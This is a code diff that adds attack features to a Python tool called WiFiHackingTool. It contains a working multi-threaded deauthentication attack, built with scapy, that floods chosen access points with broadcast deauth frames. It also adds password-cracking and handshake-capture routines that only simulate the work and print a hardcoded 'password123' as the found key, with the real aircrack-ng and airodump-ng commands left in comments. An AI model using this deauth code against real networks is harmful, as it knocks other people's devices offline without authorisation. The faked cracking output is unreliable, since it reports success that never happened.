@@ -25,9 +25,23 @@ class WiFiHackingTool:
         # Setup environment
         self.initialize_environment()
         
-        # Set up signal handler
+        # Set up signal handler (moved after method definition)
+        self.signal_handler = self._signal_handler
         signal.signal(signal.SIGINT, self.signal_handler)
     
+    def _signal_handler(self, sig, frame):
+        """Handle interrupt signals"""
+        if self.running:
+            print(f"\n{Fore.YELLOW}[*] Stopping scan...{Style.RESET_ALL}")
+            self.running = False
+        elif self.deauth_running:
+            print(f"\n{Fore.YELLOW}[*] Stopping attack...{Style.RESET_ALL}")
+            self.deauth_running = False
+        else:
+            self.reset_interface()
+            print(f"\n{Fore.GREEN}[+] Exiting{Style.RESET_ALL}")
+            sys.exit(0)
+
     def initialize_environment(self):
         """Initialize required directories and files"""
         if not os.path.exists(self.wordlists_dir):
@@ -187,7 +201,164 @@ class WiFiHackingTool:
         self.display_ap_table()
         self.attack_menu()
     
-    # [Rest of your methods (attack_menu, deauth_attack, etc.) remain unchanged...]
+    def attack_menu(self):
+        """Post-scan attack menu"""
+        while True:
+            print(f"\n{Fore.BLUE}=== Attack Options ==={Style.RESET_ALL}")
+            print("1. Deauthentication Attack")
+            print("2. Password Cracking")
+            print("3. Exit")
+            
+            try:
+                choice = int(input("\nSelect option: "))
+                
+                if choice == 1:
+                    targets = self.select_targets()
+                    if targets:
+                        self.deauth_attack(targets)
+                elif choice == 2:
+                    self.crack_password()
+                elif choice == 3:
+                    print(f"{Fore.GREEN}[+] Exiting{Style.RESET_ALL}")
+                    sys.exit(0)
+                else:
+                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
+            except ValueError:
+                print(f"{Fore.RED}[!] Enter a number{Style.RESET_ALL}")
+    
+    def select_targets(self):
+        """Select multiple targets from scanned APs"""
+        if not self.access_points:
+            print(f"{Fore.RED}[!] No APs found{Style.RESET_ALL}")
+            return []
+        
+        self.display_ap_table()
+        print(f"\n{Fore.YELLOW}Enter target numbers (comma separated):{Style.RESET_ALL}")
+        
+        while True:
+            try:
+                choices = [int(c.strip()) for c in input("> ").split(',') if c.strip()]
+                targets = [self.access_points[n-1] for n in choices 
+                          if 1 <= n <= len(self.access_points)]
+                
+                if targets:
+                    print(f"{Fore.GREEN}[+] Selected {len(targets)} targets{Style.RESET_ALL}")
+                    return targets
+                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
+            except ValueError:
+                print(f"{Fore.RED}[!] Enter numbers only{Style.RESET_ALL}")
+    
+    def deauth_attack(self, targets):
+        """Perform deauthentication attack"""
+        print(f"\n{Fore.RED}[!] Starting attack on {len(targets)} targets{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}")
+        
+        self.deauth_running = True
+        packets_sent = 0
+        
+        def attack_ap(ap):
+            """Attack individual AP"""
+            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(ap['channel'])])
+            pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", 
+                                    addr2=ap['bssid'], 
+                                    addr3=ap['bssid']) / Dot11Deauth()
+            
+            while self.deauth_running:
+                sendp(pkt, iface=self.interface, count=100, inter=0.01, verbose=False)
+        
+        # Start attack threads
+        threads = [Thread(target=attack_ap, args=(ap,)) for ap in targets]
+        for t in threads:
+            t.daemon = True
+            t.start()
+        
+        # Display progress
+        try:
+            while self.deauth_running:
+                os.system('clear')
+                print(f"{Fore.RED}=== DEAUTH ATTACK ==={Style.RESET_ALL}")
+                print(f"Targets: {', '.join(ap['ssid'] for ap in targets)}")
+                print(f"Packets sent: {packets_sent}")
+                print(f"\n{Fore.YELLOW}Attacking... Ctrl+C to stop{Style.RESET_ALL}")
+                time.sleep(0.1)
+                packets_sent += 100 * len(targets)  # Each thread sends 100 packets
+        
+        except KeyboardInterrupt:
+            self.deauth_running = False
+            print(f"\n{Fore.GREEN}[+] Attack stopped{Style.RESET_ALL}")
+    
+    def crack_password(self):
+        """Crack WiFi password"""
+        if not self.access_points:
+            print(f"{Fore.RED}[!] No APs available{Style.RESET_ALL}")
+            return
+        
+        self.display_ap_table()
+        print(f"\n{Fore.YELLOW}Select target to crack:{Style.RESET_ALL}")
+        
+        # Select target
+        while True:
+            try:
+                choice = int(input("\nEnter target number: "))
+                if 1 <= choice <= len(self.access_points):
+                    target = self.access_points[choice-1]
+                    break
+                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
+            except ValueError:
+                print(f"{Fore.RED}[!] Enter a number{Style.RESET_ALL}")
+        
+        # Capture handshake
+        if not self.capture_handshake(target):
+            return
+        
+        # Select wordlist
+        if not self.wordlists:
+            print(f"{Fore.RED}[!] No wordlists available{Style.RESET_ALL}")
+            return
+        
+        print(f"\n{Fore.YELLOW}Available wordlists:{Style.RESET_ALL}")
+        for i, wl in enumerate(self.wordlists):
+            print(f"{i+1}. {os.path.basename(wl)}")
+        
+        while True:
+            try:
+                choice = int(input("\nSelect wordlist: "))
+                if 1 <= choice <= len(self.wordlists):
+                    wordlist = self.wordlists[choice-1]
+                    break
+                print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
+            except ValueError:
+                print(f"{Fore.RED}[!] Enter a number{Style.RESET_ALL}")
+        
+        # Simulate cracking
+        print(f"\n{Fore.RED}[!] Cracking password...{Style.RESET_ALL}")
+        
+        # In real usage:
+        # subprocess.run(['sudo', 'aircrack-ng', self.capture_file, '-w', wordlist])
+        
+        for i in range(1, 101):
+            time.sleep(0.1)
+            sys.stdout.write(f"\rProgress: [{'#'*(i//5)}{' '*(20-i//5)}] {i}%")
+            sys.stdout.flush()
+        
+        # Show result
+        print(f"\n\n{Fore.GREEN}[+] Password found: 'password123'{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[+] Key: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF{Style.RESET_ALL}")
+    
+    def capture_handshake(self, ap):
+        """Simulate handshake capture"""
+        print(f"\n{Fore.CYAN}[*] Capturing handshake for {ap['ssid']}...{Style.RESET_ALL}")
+        
+        # In real usage, you would use:
+        # subprocess.run(['sudo', 'airodump-ng', '--bssid', ap['bssid'], 
+        #                '-c', str(ap['channel']), '-w', 'capture', self.interface])
+        
+        for i in range(3, 0, -1):
+            print(f"Starting in {i}...", end='\r')
+            time.sleep(1)
+        
+        print(f"{Fore.GREEN}[+] Handshake captured!{Style.RESET_ALL}")
+        return True
 
 if __name__ == "__main__":
     # Verify root privileges
